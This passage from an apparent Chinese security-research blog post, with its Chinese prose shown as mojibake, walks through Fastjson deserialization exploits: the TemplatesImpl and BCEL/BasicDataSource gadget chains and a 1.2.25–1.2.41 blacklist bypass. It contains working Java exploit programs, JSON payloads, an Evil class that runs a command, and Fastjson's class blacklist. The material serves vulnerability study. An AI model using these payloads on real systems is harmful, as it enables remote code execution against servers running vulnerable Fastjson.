alt="image-20240830172002493"></p><p>è¿™é‡Œçš„DEFAULT_TYPE_KEYå°±æ˜¯@typeï¼Œç„¶åè°ƒç”¨scanSymbol()è·å–åˆ°äº†@typeå¯¹åº”çš„æŒ‡å®šç±»<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>ï¼Œå¹¶è°ƒç”¨TypeUtils.loadClass()å‡½æ•°åŠ è½½è¯¥ç±»</p><p>ç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408301723344.png" alt="image-20240830172310261"></p><p>è¿™é‡Œå¯¹ç±»åè¿›è¡Œäº†åˆ¤æ–­ï¼Œæ¶‰åŠåˆ°åé¢æ–°ç‰ˆæœ¬ç»•è¿‡é»‘åå•çš„æ–¹æ³•å…ˆç•™æ„ä¸€ä¸‹</p><p>ç°åœ¨ç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408301725620.png" alt="image-20240830172504533"></p><p>è¿™é‡Œé€šè¿‡AppClassLoaderåŠ è½½åputåˆ°mappingsé‡Œé¢</p><p>è¿”å›åï¼Œç¨‹åºç»§ç»­å›åˆ°<code>DefaultJSONParser.parseObject()</code>ä¸­å¾€ä¸‹æ‰§è¡Œï¼Œåœ¨æœ€åè°ƒç”¨<code>JavaBeanDeserializer.deserialze()</code>å¯¹ç›®æ ‡ç±»è¿›è¡Œååºåˆ—åŒ–</p><p><img src="https://cdn.clown2024.cn/202408301727881.png" alt="image-20240830172750780"></p><p><strong>å…³é”®åˆ©ç”¨é“¾</strong></p><p>æ¥æ ¹æ®payloadçœ‹ä¸€ä¸‹å…³é”®çš„å±æ€§å¯¹åº”çš„setå’Œgetæ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +<br>                    &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode+&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot; +<br>                    &quot;\&quot;_version\&quot;:\&quot;\&quot;&#125;\n&quot;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çŸ¥é“fastjsonçš„JSON.parseObjectä¼šè°ƒç”¨getå’Œsetæ–¹æ³•ï¼Œè¿™é‡Œåˆ©ç”¨çš„æ˜¯TemplatesImplçš„getæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202408302131055.png" alt="image-20240830213116051"></p><p>ç„¶ååé¢å…¶å®å°±æ˜¯ccé“¾çš„åŠ¨æ€ç±»åŠ è½½éƒ¨åˆ†ï¼Œé“¾å­å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TemplatesImpl#newTransformer()-&gt;TemplatesImpl#getTransletInstance()-&gt;TemplatesImpl#defineTransletClasses()-&gt;defineClass<br></code></pre></td></tr></table></figure><p>ç„¶åå›å¿†ä¸€ä¸‹æœ‰äº›åœ°æ–¹ä¸ºä»€ä¹ˆè¦èµ‹å€¼</p><p><img src="https://cdn.clown2024.cn/202408302145512.png" alt="image-20240830214556445"></p><p>è¿™é‡Œ_tfactoryè¦è°ƒç”¨æ–¹æ³•æ‰€ä»¥ä¸èƒ½ä¸ºç©ºè¦èµ‹å€¼</p><p><img src="https://cdn.clown2024.cn/202408302146869.png" alt="image-20240830214643793"></p><p>è¿™é‡Œè¦è°ƒç”¨defineTransletClasses()æ–¹æ³•æ‰€ä»¥_name!&#x3D;nullï¼Œ_class&#x3D;&#x3D;nullåé¢å°±æ²¡æœ‰äº†</p><blockquote><p>è¿™é‡Œy4å¸ˆå‚…çš„payloadè¿˜å¸¦äº†ä¸€ä¸ªversionæˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæˆ‘å»æ‰äº†ä¹Ÿæ˜¯èƒ½å¤Ÿæ­£å¸¸å¼¹è®¡ç®—å™¨çš„</p></blockquote><p><strong>base64</strong></p><p>å†çœ‹ä¸€ä¸‹ä¸ºä»€ä¹ˆéœ€è¦å°†å­—èŠ‚ç è¿›è¡Œbase64å¤„ç†</p><p>è¿™æ˜¯å› ä¸ºFastJsonæå–byte[]æ•°ç»„å­—æ®µå€¼æ—¶ä¼šè¿›è¡ŒBase64è§£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ payloadæ—¶éœ€è¦å¯¹ <code>_bytecodes</code> è¿›è¡ŒBase64å¤„ç†</p><p><img src="https://cdn.clown2024.cn/202408302203171.png" alt="image-20240830220348083"></p><p><img src="https://cdn.clown2024.cn/202408302204473.png" alt="image-20240830220404414"></p><p><strong>å…³äºä¸‹åˆ’çº¿çš„å¤„ç†</strong></p><p><img src="https://cdn.clown2024.cn/202408302206839.png" alt="image-20240830220656753"></p><p>æ˜¯åœ¨è¿™ä¸ªåœ°æ–¹çš„smartMatchå‡½æ•°</p><p><img src="https://cdn.clown2024.cn/202408302207795.png" alt="image-20240830220749721"></p><p>ç„¶ååœ¨è¿™é‡Œå°†ä¸‹åˆ’çº¿è¿›è¡Œäº†æ›¿æ¢</p><h1><span id="fastjson1115-1224ä¸bcelå­—èŠ‚ç åŠ è½½">Fastjson1.1.15-1.2.24ä¸BCELå­—èŠ‚ç åŠ è½½</span></h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoaderå»å“ªäº† | ç¦»åˆ«æ­Œ (leavesongs.com)</a>ï¼Œ<a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html">JavaåŠ¨æ€ç±»åŠ è½½ï¼Œå½“FastJsoné‡åˆ°å†…ç½‘ â€“ KINGX</a></p><p>è¿™ç§å’Œä¸Šé¢çš„TemplatesImplé“¾å­æ‰“æ³•éƒ½å¯ä»¥ç”¨äºä¸å‡ºç½‘çš„æ‰“æ³•ï¼Œä¸è¿‡æ¯”TemplatesImplåˆ©ç”¨æ›´å¹¿æ³›ä¸€ç‚¹</p><p>è¿™é‡Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªä¾èµ–</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å…ˆç»™å‡ºåªç”¨parseå°±èƒ½è§¦å‘çš„payloadå½¢å¼</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">//è¿™ä¸ªå¯æœ‰å¯æ— éƒ½ä¸å½±å“</span><br>        <span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.dbcp.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;x&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ä»£ç ï¼š</p><p>Evil.java</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.BECL;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.BECL;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Repository.lookupClass(Evil.class);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(cls.getBytes(), <span class="hljs-literal">true</span>);<br>        System.out.println(code);<br><span class="hljs-comment">//        String payload=&quot;&#123;\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;@type\&quot;: \&quot;org.apache.commons.dbcp.BasicDataSource\&quot;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;driverClassLoader\&quot;: &#123;\n&quot; +</span><br><span class="hljs-comment">//                &quot;            \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot; +</span><br><span class="hljs-comment">//                &quot;        &#125;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;driverClassName\&quot;: \&quot;$$BCEL$$&quot;+code+&quot;\&quot;\n&quot; +</span><br><span class="hljs-comment">//                &quot;&#125;&quot;;  //è¿™ä¸ªåœ¨parseObjectçš„æ—¶å€™é€‚ç”¨</span><br>        String payload=<span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.alibaba.fastjson.JSONObject\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;x\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.commons.dbcp.BasicDataSource\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;                \&quot;driverClassName\&quot;: \&quot;$$BCEL$$&quot;</span>+code+<span class="hljs-string">&quot;\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;: \&quot;x\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409040119696.png" alt="image-20240904011923509"></p><p><strong>åˆ©ç”¨é“¾åˆ†æ</strong></p><p>å»çœ‹ä¸€ä¸‹BasicDataSourceçš„æºç ä¸­å¯¹åº”çš„å…³é”®æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409032251464.png" alt="image-20240903225126325"></p><p><img src="https://cdn.clown2024.cn/202409032305310.png" alt="image-20240903230514187"></p><p>å¥½å§æƒ³è‡ªå·±å»çœ‹å‘ç°å¥½åƒè¿™ä¸ªè°ƒç”¨ä¸å¤ªä¸€æ ·ï¼Œè¿™æ˜¯ä¼šè°ƒç”¨çš„setæ–¹æ³•ï¼Œæ–‡ç« çš„åˆ©ç”¨é“¾å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">BasicDataSource.getConnection() -&gt; createDataSource() -&gt; createConnectionFactory()<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯æ–‡ç« çš„è§£é‡Šï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">æŒ‰ç†è¯´åº”è¯¥æ˜¯ä¸ä¼šè°ƒç”¨åˆ°getConnectionæ–¹æ³•çš„ï¼ŒåŸPoCä¸­å¾ˆå·§å¦™çš„åˆ©ç”¨äº† JSONObjectå¯¹è±¡çš„ toString() æ–¹æ³•å®ç°äº†çªç ´ã€‚JSONObjectæ˜¯Mapçš„å­ç±»ï¼Œåœ¨æ‰§è¡ŒtoString() æ—¶ä¼šå°†å½“å‰ç±»è½¬ä¸ºå­—ç¬¦ä¸²å½¢å¼ï¼Œä¼šæå–ç±»ä¸­æ‰€æœ‰çš„Fieldï¼Œè‡ªç„¶ä¼šæ‰§è¡Œç›¸åº”çš„ getter ç­‰æ–¹æ³•ã€‚<br><br>é¦–å…ˆï¼Œåœ¨ &#123;â€œ@typeâ€: â€œorg.apache.tomcat.dbcp.dbcp2.BasicDataSourceâ€â€¦â€¦&#125; è¿™ä¸€æ•´æ®µå¤–é¢å†å¥—ä¸€å±‚&#123;&#125;ï¼Œååºåˆ—åŒ–ç”Ÿæˆä¸€ä¸ª JSONObject å¯¹è±¡ã€‚<br><br>ç„¶åï¼Œå°†è¿™ä¸ª JSONObject æ”¾åœ¨ JSON Key çš„ä½ç½®ä¸Šï¼Œåœ¨ JSON ååºåˆ—åŒ–çš„æ—¶å€™ï¼ŒFastJson ä¼šå¯¹ JSON Key è‡ªåŠ¨è°ƒç”¨ toString() æ–¹æ³•ï¼Œäºæ˜¯ä¹å°±è§¦å‘äº†BasicDataSource.getConnection()ã€‚<br></code></pre></td></tr></table></figure><blockquote><p>æ„Ÿè§‰æ–‡ç« è®²å¾—éƒ½æœ‰ç‚¹æ€ªï¼Œç„¶åè‡ªå·±è°ƒäº†åŠå¤©æ‰æ‰¾åˆ°ç¡®åˆ‡ä½ç½®ï¼Œæ¥ä¸‹æ¥åˆ†æä¹Ÿä¸çŸ¥é“æ­£ä¸æ­£ç¡®ï¼Œèƒ½è¯´æœæˆ‘è‡ªå·±å°±å¥½ï¼ˆ</p></blockquote><p><img src="https://cdn.clown2024.cn/202409040058412.png" alt="image-20240904005819248"></p><p>é¦–å…ˆèµ°åˆ°parseObjectè¿™é‡Œï¼Œç„¶åä¸€ç›´å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409040100256.png" alt="image-20240904010058091"></p><p>èµ°åˆ°è¿™ä¼šè°ƒç”¨keyçš„toStringæ–¹æ³•ï¼Œè¿™æ—¶å€™valueä¸ºBasicDataSourceçš„æ—¶å€™æ˜¯å…³é”®æˆ‘ä»¬è·Ÿè¿›å»çœ‹</p><p><img src="https://cdn.clown2024.cn/202409040103451.png" alt="image-20240904010314293"></p><p>ç„¶ååˆ°è¿™ä¸ªwriteæ–¹æ³•ï¼Œç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409040105060.png" alt="image-20240904010542894"></p><p>ç„¶åè¿›åˆ°ä¸€ä¸ªMapçš„éå†é‡Œé¢ï¼Œå‰é¢è¿›è¡Œäº†ä¸€äº›æ“ä½œå°†ä»–è½¬æˆäº†Mapç±»å‹ï¼Œç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409040108276.png" alt="image-20240904010839142"></p><p>è¿™é‡Œå°±æ˜¯æœ€åçš„æ–¹æ³•äº†ï¼Œå¯¹å­—æ®µè¿›è¡Œéå†</p><p><img src="https://cdn.clown2024.cn/202409040111143.png" alt="image-20240904011101980"></p><p>è¿™é‡Œå¯¹æ¯ä¸ªfieldè¿›è¡Œéå†ï¼Œç„¶åè°ƒç”¨ä»–ä»¬çš„getæ–¹æ³•ï¼Œè¿™é‡Œéå†åˆ°connectionå°±ä¼šè°ƒç”¨æˆ‘ä»¬æåˆ°çš„getConnection</p><p><img src="https://cdn.clown2024.cn/202409040112186.png" alt="image-20240904011236055"></p><p><img src="https://cdn.clown2024.cn/202409040113127.png" alt="image-20240904011312996"></p><p><img src="https://cdn.clown2024.cn/202409040051567.png" alt="image-20240904005104420"></p><p>æœ€ç»ˆæˆåŠŸè°ƒç”¨ï¼Œå…¶å®è°ƒçš„æˆ‘è¿˜æ˜¯æœ‰ç‚¹ä¸æ˜ä¸ç™½ï¼Œåªèƒ½è¯´å¤§è‡´çŸ¥é“</p><p>å¦‚æœæ˜¯parseObjectçš„è¯ï¼Œä»–ä¼šè§¦å‘æ‰€æœ‰getå’Œsetæ–¹æ³•ï¼Œç›´æ¥è¿™ç§payloadä¹Ÿå¯ä»¥ï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b......&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>é™¤äº†ä¸Šé¢çš„ä¾èµ–è¿˜æœ‰ä¸€äº›é€‚ç”¨æ›´å¹¿æ³›çš„ä¾èµ–ï¼Œä¸è¿‡åˆ©ç”¨ä¾æ—§æ˜¯BasicDataSourceç±»</p><p>åœ¨æ—§ç‰ˆæœ¬çš„ tomcat-dbcp åŒ…ä¸­ï¼Œå¯¹åº”çš„è·¯å¾„æ˜¯ org.apache.tomcat.dbcp.dbcp.BasicDataSource</p><p>æ¯”å¦‚ï¼š6.0.53ã€7.0.81ç­‰ç‰ˆæœ¬</p><p>åœ¨Tomcat 8.0ä¹‹ååŒ…è·¯å¾„æœ‰æ‰€å˜åŒ–ï¼Œæ›´æ”¹ä¸ºäº† org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p><h1><span id="fastjson1225-1241ç»•è¿‡">Fastjson1.2.25-1.2.41ç»•è¿‡</span></h1><p>Fastjsonåœ¨1.2.25ç‰ˆæœ¬å°±åŠ å…¥äº†é»‘ç™½åå•æœºåˆ¶</p><p>è¿™æ—¶å€™æˆ‘ä»¬å†å»æ‰§è¡Œå‰é¢çš„expå°±ä¼šçˆ†å‡ºä¸‹é¢çš„é”™è¯¯</p><p><img src="https://cdn.clown2024.cn/202408302326388.png" alt="image-20240830232605306"></p><p>å†å»çœ‹ParserConfigé‡Œé¢å¯ä»¥çœ‹åˆ°å¾ˆå¤šç±»è¢«åŠ å…¥äº†é»‘åå•</p><p><img src="https://cdn.clown2024.cn/202408302328066.png" alt="image-20240830232822995"></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">bsh<br>com.mchange<br>com.sun.<br>java.lang.Thread<br>java.net.Socket<br>java.rmi<br>javax.xml<br>org.apache.bcel<br>org.apache.commons.beanutils<br>org.apache.commons.collections.Transformer<br>org.apache.commons.collections.functors<br>org.apache.commons.collections4.comparators<br>org.apache.commons.fileupload,org.apache.myfaces.context.servlet<br>org.apache.tomcat<br>org.apache.wicket.util<br>org.codehaus.groovy.runtime<br>org.hibernate<br>org.jboss,org.mozilla.javascript<br>org.python.core<br>org.springframework<br></code></pre></td></tr></table></figure><p>å…ˆç»™å‡ºç»•è¿‡çš„payload</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//å¼€å¯AutoTypeSupport</span><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;&quot;</span>; <span class="hljs-comment">//å‰é¢åŠ äº†Lï¼Œç»“å°¾åŠ äº†;</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408310015033.png" alt="image-20240831001535905"></p><p>ç„¶åæ¥çœ‹ä¸€ä¸‹å…·ä½“çš„ç»•è¿‡åŸç†</p><p>å…ˆå»çœ‹ä¸€ä¸‹checkAutoTypeå‡½æ•°åœ¨å“ªé‡Œè¢«è°ƒç”¨</p><p><img src="https://cdn.clown2024.cn/202408310022516.png" alt="image-20240831002214426"></p><p>æˆ‘ä»¬å¯ä»¥å¯¹æ¯”ä¹‹å‰çš„ç‰ˆæœ¬æ¥çœ‹ï¼Œä¹‹å‰çš„ç‰ˆæœ¬æ˜¯ç›´æ¥loadClassäº†ï¼Œæˆ‘ä»¬è¿›åˆ°è¿™ä¸ªå‡½æ•°é‡Œé¢çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/202408310026977.png" alt="image-20240831002652886"></p><p>è¿™é‡Œæˆ‘ä»¬å¦‚æœè®¾ç½®äº†autoTypeSupportä¸ºtrueä»–å°±ä¼šå»å°†æˆ‘ä»¬çš„è¿™ä¸ªç±»å»åŒ¹é…ç™½åå•ï¼ŒåŒ¹é…åˆ°äº†å°±loadClass</p><p>å¦‚æœæ²¡åŒ¹é…åˆ°å°±ä¼šè¿›åˆ°ä¸‹é¢é»‘åå•çš„åŒ¹é…</p><p><img src="https://cdn.clown2024.cn/202408310030353.png" alt="image-20240831003005272"></p><p>åŒ¹é…åˆ°é»‘åå•å°±ä¼šæŠ›å‡ºå¼‚å¸¸<strong>autoType is not support</strong></p><p><img src="https://cdn.clown2024.cn/202408310032079.png" alt="image-20240831003254981"></p><p>å¦‚æœæ²¡æœ‰å¼€å¯autoTypeSupportå°±ä¼šå…ˆåŒ¹é…é»‘åå•å†åŒ¹é…ç™½åå•</p><p>æœ€åå¦‚æœè¦æ˜¯é»‘ç™½åå•éƒ½åŒ¹é…ä¸åˆ°ï¼ŒautoTypeSupportä¸ºtrueä¸”expectClassä¸ä¸ºnullå°±ç›´æ¥loadClass</p><p><img src="https://cdn.clown2024.cn/202408310036025.png" alt="image-20240831003602958"></p><p>å¦åˆ™å°±ä¸åŠ è½½è¿™ä¸ªç±»äº†ç›´æ¥ï¼Œæˆ‘ä»¬payloadæœ€åè¿›åˆ°çš„å°±æ˜¯é»‘ç™½åå•éƒ½åŠ è½½ä¸åˆ°çš„loadClassï¼Œæˆ‘ä»¬è¿›loadClassæ–¹æ³•é‡Œé¢çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408310039880.png" alt="image-20240831003942791"></p><p>è¿™é‡Œå°±é‡åˆ°äº†æˆ‘ä»¬å‰é¢æåˆ°çš„ç”¨æ¥ç»•è¿‡çš„åœ°æ–¹</p><p>å…ˆçœ‹ç¬¬ä¸€ä¸ªç®­å¤´å¤„çš„ä»£ç ï¼Œå¦‚æœç±»åçš„å­—ç¬¦ä¸²ä»¥[å¼€å¤´ï¼Œåˆ™è¯´æ˜è¯¥ç±»æ˜¯ä¸€ä¸ªæ•°ç»„ç±»å‹ï¼Œéœ€è¦é€’å½’è°ƒç”¨loadClassæ–¹æ³•æ¥åŠ è½½æ•°ç»„å…ƒç´ ç±»å‹å¯¹åº”çš„classå¯¹è±¡ç„¶åä½¿ç”¨Array.newInstanceæ–¹æ³•æ¥åˆ›å»ºä¸€ä¸ªç©ºæ•°ç»„å¯¹è±¡ï¼Œæœ€åè¿”å›è¯¥æ•°ç»„å¯¹è±¡çš„classå¯¹è±¡</p><p>ç¬¬äºŒä¸ªç®­å¤´å¤„çš„ä»£ç 